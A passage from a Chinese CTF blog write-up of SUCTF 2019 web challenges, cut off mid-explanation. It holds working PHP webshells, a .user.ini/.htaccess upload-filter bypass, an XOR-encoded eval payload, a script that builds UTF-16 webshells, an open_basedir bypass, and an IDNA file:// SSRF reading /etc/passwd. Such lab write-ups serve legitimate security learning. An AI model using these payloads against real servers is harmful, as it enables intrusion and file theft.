<!DOCTYPE html>
<html lang="en">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="suctf2019-wp"/>




  <meta name="keywords" content="wp," />





  <link rel="alternate" href="/atom.xml" title="glotozz'blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="https://glotozz.github.io/2019/08/17/suctf2019-wp/"/>


<meta property="og:type" content="article">
<meta property="og:title" content="suctf2019-wp">
<meta property="og:url" content="https://glotozz.github.io/2019/08/17/suctf2019-wp/index.html">
<meta property="og:site_name" content="glotozz&#39;blog">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://phpff.com/wp-content/uploads/ckfinder/images/asii.png">
<meta property="og:image" content="https://i.loli.net/2019/09/14/nAV8tcTo9ywDC2f.png">
<meta property="og:image" content="https://i.loli.net/2019/09/14/TQD6SjmqNcubXCv.png">
<meta property="article:published_time" content="2019-08-17T01:09:09.000Z">
<meta property="article:modified_time" content="2020-05-20T16:08:36.033Z">
<meta property="article:author" content="glotozz">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://phpff.com/wp-content/uploads/ckfinder/images/asii.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  


<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/song/media/outer/url?id=28592088.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="/57a2_fa12_13ff_c310c1889d0f14b24334ad7afef6b9b1.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
    <title> suctf2019-wp - glotozz'blog </title>
  <meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="glotozz'blog" type="application/atom+xml">
</head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">glotozz'blog</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/read">
                            
                            
                                Read
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/stars">
                            
                            
                                Stars
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          suctf2019-wp
        
      </h1>

      <time class="post-time">
          Aug 17 2019
      </time>
    </header>



    
            <div class="post-content">
            <meta name="referrer" content="no-referrer">
<a id="more"></a>

<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
<!-- toc -->

<ul>
<li><a href="#web1">web1</a></li>
<li><a href="#web2">web2</a></li>
<li><a href="#python-nginx">python nginx</a></li>
<li><a href="#easy_sql">easy_sql</a></li>
<li><a href="#upload-labs-2">Upload labs 2</a></li>
<li><a href="#参考链接">参考链接：</a></li>
</ul>
<!-- tocstop -->

<hr>
<h3><span id="web1">web1</span></h3><p>本来是没啥思路的，上传.htaccess成功但是不被解析。。。。</p>
<p>上传php文件的时候提示不能存在&lt;?，这个用下面的绕过即可，但是要求php小于7.0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;php&gt;system(&quot;cat 访问的文件名.txt&quot;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>突然农大的一位大佬说可以利用.user.ini</p>
<p>因为当前文件夹下存在index.php，所以上传.user.ini.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;1.jpg</span><br></pre></td></tr></table></figure>

<p>继续上传1.jpg</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt;@eval($_POST[cmd])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>访问路径</p>
<p>修改cmd=system(‘cat /flag’);即可</p>
<p>==========================================================================</p>
<h3><span id="web2">web2</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    function get_the_flag()&#123;</span><br><span class="line">        &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!! </span><br><span class="line">        $userdir &#x3D; &quot;upload&#x2F;tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">        if(!file_exists($userdir))&#123;</span><br><span class="line">        mkdir($userdir);</span><br><span class="line">        &#125;</span><br><span class="line">        if(!empty($_FILES[&quot;file&quot;]))&#123;</span><br><span class="line">            $tmp_name &#x3D; $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">            $name &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">            $extension &#x3D; substr($name, strrpos($name,&quot;.&quot;)+1);</span><br><span class="line">        if(preg_match(&quot;&#x2F;ph&#x2F;i&quot;,$extension)) die(&quot;^_^&quot;); </span><br><span class="line">            if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!&#x3D;&#x3D;False) die(&quot;^_^&quot;);</span><br><span class="line">        if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); </span><br><span class="line">            $path&#x3D; $userdir.&quot;&#x2F;&quot;.$name;</span><br><span class="line">            @move_uploaded_file($tmp_name, $path);</span><br><span class="line">            print_r($path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $hhh &#x3D; @$_GET[&#39;_&#39;];</span><br><span class="line"></span><br><span class="line">    if (!$hhh)&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(strlen($hhh)&gt;18)&#123;</span><br><span class="line">        die(&#39;One inch long, one inch strong!&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ( preg_match(&#39;&#x2F;[\x00- 0-9A-Za-z\&#39;&quot;\&#96;~_&amp;.,|&#x3D;[\x7F]+&#x2F;i&#39;, $hhh) )</span><br><span class="line">        die(&#39;Try something else!&#39;);</span><br><span class="line"></span><br><span class="line">    $character_type &#x3D; count_chars($hhh, 3);</span><br><span class="line">    if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);</span><br><span class="line"></span><br><span class="line">    eval($hhh);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>长度小于等于18，使用的字符串种类小于等于12，</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#39;&#x2F;[\x00- 0-9A-Za-z\&#39;&quot;\&#96;~_&amp;.,|&#x3D;[\x7F]+&#x2F;i&#39;, $hhh)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>正则的意思是匹配 \x00 到空格 (\x20) 的字符，0 到 9 的数字一些字符 以及 DEL（\x7f）字符</p>
<p>\x00    =&gt;    @</p>
<p>\x7F    =&gt;    </p>
<p><img src="http://phpff.com/wp-content/uploads/ckfinder/images/asii.png" alt="img"></p>
<p>其实这是完整的，应该存在256种，直到\xff</p>
</blockquote>
<p>首先第一步需要绕过传值，本地测试把@去掉，提示</p>
<p><strong>Notice: Undefined index: _ in E:\Program Files\phpstudy_pro\WWW\2.php on line</strong> <em>4</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">说明这里是_即可，所以get传值的key为_</span><br></pre></td></tr></table></figure>



<p>韩大佬率先写出了如下payload，利用异或构造出_GET，再利用{}的trick</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_&#x3D;$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo</span><br></pre></td></tr></table></figure>



<p>自己写了个脚本，很丑陋</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">G &#x3D; []</span><br><span class="line">E &#x3D; []</span><br><span class="line">T &#x3D; []</span><br><span class="line">_ &#x3D; []</span><br><span class="line"></span><br><span class="line">str &#x3D; r&#39;\&#39;&quot;&#96;~_&amp;.,|&#x3D;[0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><br><span class="line">#print len(str)</span><br><span class="line">str2 &#x3D; []</span><br><span class="line">for i1 in str:</span><br><span class="line">    str2.append(ord(i1))</span><br><span class="line"></span><br><span class="line">#print str2</span><br><span class="line">str1 &#x3D; &quot;0123456789abcdef&quot;</span><br><span class="line">str3 &#x3D; []</span><br><span class="line">for i1 in str1:</span><br><span class="line">    for j1 in str1:</span><br><span class="line">        tmp &#x3D; &quot;0x&quot;+i1+j1</span><br><span class="line">        str3.append(tmp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num &#x3D; 1</span><br><span class="line">for i1 in str3:</span><br><span class="line">    for j1 in str3:</span><br><span class="line">        tmp1 &#x3D; int(i1,16)</span><br><span class="line">        tmp2 &#x3D; int(j1,16)</span><br><span class="line"></span><br><span class="line">        if (tmp1 in str2) or (tmp2 in str2) or (0&lt;&#x3D;tmp1&lt;&#x3D;32) or (0&lt;&#x3D;tmp2&lt;&#x3D;32) or (tmp1&#x3D;&#x3D;127) or (tmp2&#x3D;&#x3D;127):</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        if tmp1^tmp2&#x3D;&#x3D;ord(&#39;G&#39;):</span><br><span class="line">            G.append(i1+&quot;^&quot;+j1)</span><br><span class="line">        if tmp1^tmp2&#x3D;&#x3D;ord(&#39;E&#39;):</span><br><span class="line">            E.append(i1+&quot;^&quot;+j1)</span><br><span class="line">        if tmp1^tmp2&#x3D;&#x3D;ord(&#39;T&#39;):</span><br><span class="line">            T.append(i1+&quot;^&quot;+j1)</span><br><span class="line">        if tmp1^tmp2&#x3D;&#x3D;ord(&#39;_&#39;):</span><br><span class="line">            _.append(i1+&quot;^&quot;+j1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print _</span><br><span class="line">print G</span><br><span class="line">print E</span><br><span class="line">print T</span><br><span class="line">minn &#x3D; 1000000000</span><br><span class="line">result &#x3D; &quot;&quot;</span><br><span class="line">for t1 in _:</span><br><span class="line">    for t2 in G:</span><br><span class="line">        for t3 in E:</span><br><span class="line">            for t4 in T:</span><br><span class="line">                res &#x3D; set()</span><br><span class="line">                tmp &#x3D; t1.split(&#39;^&#39;)</span><br><span class="line">                res.add(tmp[0])</span><br><span class="line">                res.add(tmp[1])</span><br><span class="line">                tmp &#x3D; t2.split(&#39;^&#39;)</span><br><span class="line">                res.add(tmp[0])</span><br><span class="line">                res.add(tmp[1])</span><br><span class="line">                tmp &#x3D; t3.split(&#39;^&#39;)</span><br><span class="line">                res.add(tmp[0])</span><br><span class="line">                res.add(tmp[1])</span><br><span class="line">                tmp &#x3D; t4.split(&#39;^&#39;)</span><br><span class="line">                res.add(tmp[0])</span><br><span class="line">                res.add(tmp[1])</span><br><span class="line">                if len(res) &lt;&#x3D; minn:</span><br><span class="line">                    minn &#x3D; len(res)</span><br><span class="line">                    result &#x3D; t1 + &quot; &quot; + t2 + &quot; &quot; + t3 + &quot; &quot; + t4</span><br><span class="line">                    print result</span><br><span class="line"></span><br><span class="line">print result</span><br></pre></td></tr></table></figure>

<blockquote>
<p>一开始在对结果更新的时候选择了len(res)&lt;minn，导致出现的结果如下</p>
</blockquote>
<p>%24%3c%3e%2f^%7b%7b%7b%7b</p>
<p>跑出来了很多，但是要注意有一些不行，比如上面这个，存在&lt;&gt;，会导致php语法错误。所以用韩大佬的方法就是直接用%ff异或👍</p>
<blockquote>
<p>将结果更新修改为len(res)&lt;=minn，或者直接从列表在选择最后一个即可，必然是%ff</p>
</blockquote>
<p>最后构造</p>
<p>%a0%b8%ba%ab^%ff%ff%ff%ff</p>
<p>完整payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_&#x3D;$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo</span><br></pre></td></tr></table></figure>

<p>成功执行函数。</p>
<p>接下来是利用get_the_flag()上传文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$extension &#x3D; substr($name, strrpos($name,&quot;.&quot;)+1);</span><br><span class="line">if(preg_match(&quot;&#x2F;ph&#x2F;i&quot;,$extension)) die(&quot;^_^&quot;); </span><br><span class="line">if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!&#x3D;&#x3D;False) die(&quot;^_^&quot;);</span><br><span class="line">if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;);</span><br></pre></td></tr></table></figure>

<p>自己在当前页面构造一个文件上传</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form  method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;上传文件&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意上面的name要改成file，和后端php代码一致</p>
</blockquote>
<blockquote>
<p>strrpos()返回字符串 <code>haystack</code> 中 <code>needle</code> 最后一次出现的数字位置。</p>
<p>返回提取的子字符串， 或者在失败时返回 <strong>FALSE</strong>。</p>
</blockquote>
<p>php的后缀和&lt;?似乎无法绕过（php7.2），</p>
<p>上传.htaccess，在这个c文件中高和宽都是有#在前面的，那么我们即使把它放在.htaccess文件中也不会影响.htaccess的实际运行效果，所以新的.htaccess文件内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br><span class="line">php_value zend.multibyte 1</span><br><span class="line">php_value zend.detect_unicode 1</span><br><span class="line">php_value display_errors 1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">接下来可以上传jpg了，那么对于上传的php要绕过其&lt;?的过滤，目标服务器是php7.2那么</span><br><span class="line"></span><br><span class="line">&lt;script&gt;形式不行，这里使用了php内容的不同编码格式来bypass，只要把内容换个编码形式就好，作者用的是utf-16，</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/09/14/nAV8tcTo9ywDC2f.png" alt="Snipaste_2019-09-14_20-27-53.png"></p>
<p>给出链接中生成的脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"># !&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line"># Description : create and bypass file upload filter with .htaccess</span><br><span class="line"># Author : Thibaud Robin</span><br><span class="line"></span><br><span class="line"># Will prove the file is a legit xbitmap file and the size is 1337x1337</span><br><span class="line">SIZE_HEADER &#x3D; b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def generate_php_file(filename, script):</span><br><span class="line">    phpfile &#x3D; open(filename, &#39;wb&#39;)</span><br><span class="line"></span><br><span class="line">    phpfile.write(script.encode(&#39;utf-16be&#39;))</span><br><span class="line">    phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">    phpfile.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def generate_htacess():</span><br><span class="line">    htaccess &#x3D; open(&#39;..htaccess&#39;, &#39;wb&#39;)</span><br><span class="line"></span><br><span class="line">    htaccess.write(SIZE_HEADER)</span><br><span class="line">    htaccess.write(b&#39;AddType application&#x2F;x-httpd-php .php16\n&#39;)</span><br><span class="line">    htaccess.write(b&#39;php_value zend.multibyte 1\n&#39;)</span><br><span class="line">    htaccess.write(b&#39;php_value zend.detect_unicode 1\n&#39;)</span><br><span class="line">    htaccess.write(b&#39;php_value display_errors 1\n&#39;)</span><br><span class="line"></span><br><span class="line">    htaccess.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">generate_htacess()</span><br><span class="line"></span><br><span class="line">generate_php_file(&quot;webshell.php16&quot;, &quot;&lt;?php system($_GET[&#39;cmd&#39;]); die(); ?&gt;&quot;)</span><br><span class="line">generate_php_file(&quot;scandir.php16&quot;, &quot;&lt;?php echo implode(&#39;\n&#39;, scandir($_GET[&#39;dir&#39;])); die(); ?&gt;&quot;)</span><br><span class="line">generate_php_file(&quot;getfile.php16&quot;, &quot;&lt;?php echo file_get_contents($_GET[&#39;file&#39;]); die(); ?&gt;&quot;)</span><br><span class="line">generate_php_file(&quot;info.php16&quot;, &quot;&lt;?php phpinfo(); die(); ?&gt;&quot;)</span><br></pre></td></tr></table></figure>



<p>一开始用的system()，发现system被禁用</p>
<p>查看禁用的函数</p>
<p>使用eval构造一句话连上蚁剑</p>
<p>先尝试了蚁剑的插件去绕过disabled_function，但是反复试探还是不行</p>
<blockquote>
<p>后来再蚁剑的微信公众号发了篇文章说为什么明明成功创建so文件却不能bypass，失败的原因就是之前的 插件的代理脚本使用的是curl来进行转发的，而这个环境里没有这个扩展，于是改用fsockopen实现代理。</p>
</blockquote>
<p>中间先尝试了print_r(scandir(‘/‘))</p>
<blockquote>
<p>还存在open_basedir限制</p>
<p>查找php open_basedir bypass的poc</p>
</blockquote>
<p>将下面的php文件传上去</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    mkdir(&quot;&#x2F;tmp&#x2F;fuck&quot;);</span><br><span class="line">    chdir(&quot;&#x2F;tmp&#x2F;fuck&quot;);</span><br><span class="line">    ini_set(&#39;open_basedir&#39;,&#39;..&#39;);</span><br><span class="line">    chdir(&#39;..&#39;);</span><br><span class="line">    chdir(&#39;..&#39;);</span><br><span class="line">    chdir(&#39;..&#39;);</span><br><span class="line">    chdir(&#39;..&#39;);</span><br><span class="line">    chdir(&#39;..&#39;);</span><br><span class="line">    ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);</span><br><span class="line">    print_r(scandir(&#39;&#x2F;&#39;));</span><br><span class="line">    var_dump(file_get_contents(&#39;THis_Is_tHe_F14g&#39;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>==================================================</p>
<blockquote>
<p>web2应该算是非预期解，并没有真正绕过disable_functions，但是拿到flag已经够了</p>
<p>这次比赛只做出了这两题，还是靠农大的大佬们带的，继续加油</p>
<p>而且感觉学到了很多知识，以后还是要多看看blog（p神，一叶飘零等大大佬）以及最新的bypass</p>
</blockquote>
<p>===============================================================</p>
<blockquote>
<p>赛后看了wp，记录下没做出来的解题思路</p>
</blockquote>
<h3><span id="python-nginx">python nginx</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def getUrl():</span><br><span class="line">	url &#x3D; request.args.get(&quot;url&quot;)</span><br><span class="line">	host &#x3D; parse.urlparse(url).hostname </span><br><span class="line">	if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">		return	&quot;我扌 your problem? 111&quot;</span><br><span class="line">		</span><br><span class="line">    parts &#x3D;list(urlsplit(url))</span><br><span class="line">    host &#x3D; parts[1] </span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return	&quot;我扌 your problem? 222 &quot;+host</span><br><span class="line">        </span><br><span class="line">    newhost &#x3D;[]</span><br><span class="line">    for h in host.split(&#39;.&#39;):</span><br><span class="line">    	newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</span><br><span class="line">    parts[1] &#x3D; &#39;.&#39;.join(newhost)    </span><br><span class="line">    #去掉 url 中的空格</span><br><span class="line">    finalUrl &#x3D; urlunsplit(parts).split(&#39; &#39;)[0]</span><br><span class="line">    host &#x3D; parse.urlparse(finalUrl).hostname</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">    	return	urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    else:</span><br><span class="line">        return &quot;我扌 your problem? 333&quot;</span><br></pre></td></tr></table></figure>

<p>我们需要最后利用下面的代码来读取文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return	urllib.request.urlopen(finalUrl).read()</span><br></pre></td></tr></table></figure>

<p>附上调试代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from urllib.parse import urlparse,urlunsplit,urlsplit</span><br><span class="line">from urllib import parse</span><br><span class="line">def get_unicode():</span><br><span class="line">    for x in range(65536):</span><br><span class="line">        uni&#x3D;chr(x)</span><br><span class="line">        url&#x3D;&quot;http:&#x2F;&#x2F;suctf.c&#123;&#125;&quot;.format(uni)</span><br><span class="line">        try:</span><br><span class="line">            if getUrl(url):</span><br><span class="line">                print(&quot;str: &quot;+uni+&#39; unicode: \\u&#39;+str(hex(x))[2:])</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getUrl(url):</span><br><span class="line">    url &#x3D; url</span><br><span class="line">    host &#x3D; parse.urlparse(url).hostname</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return False</span><br><span class="line">    parts &#x3D; list(urlsplit(url))</span><br><span class="line">    host &#x3D; parts[1]</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return False</span><br><span class="line">    newhost &#x3D; []</span><br><span class="line">    for h in host.split(&#39;.&#39;):</span><br><span class="line">        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</span><br><span class="line">    parts[1] &#x3D; &#39;.&#39;.join(newhost)</span><br><span class="line">    finalUrl &#x3D; urlunsplit(parts).split(&#39; &#39;)[0]</span><br><span class="line">    host &#x3D; parse.urlparse(finalUrl).hostname</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">get_unicode()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这个调试的思路很nice，根据题目要求作为跳出循环的条件，难点是如何知道从这里入手。</p>
</blockquote>
<p><img src="https://i.loli.net/2019/09/14/TQD6SjmqNcubXCv.png" alt="Snipaste_2019-09-14_19-43-11.png"></p>
<p>将得到的结果url编码，如下</p>
<blockquote>
<p>?url=file://suctf.c%e2%84%82/etc/passwd</p>
<p>其中%e2%84%82是怎么来的</p>
<p>\u2102</p>
<p>16进制==&gt;10进制</p>
<p>8450    （属于范围2048 - 65535）</p>
<p>==&gt;</p>
<p>0010    0001    0000    0010</p>
<p>==&gt;</p>
<p>从右至左将二进制数填充到X里面</p>
<p>1110XXXX    10XXXXXX    10XXXXXX</p>
<p>==&gt;</p>
<p>11100010    10000100    10000010</p>
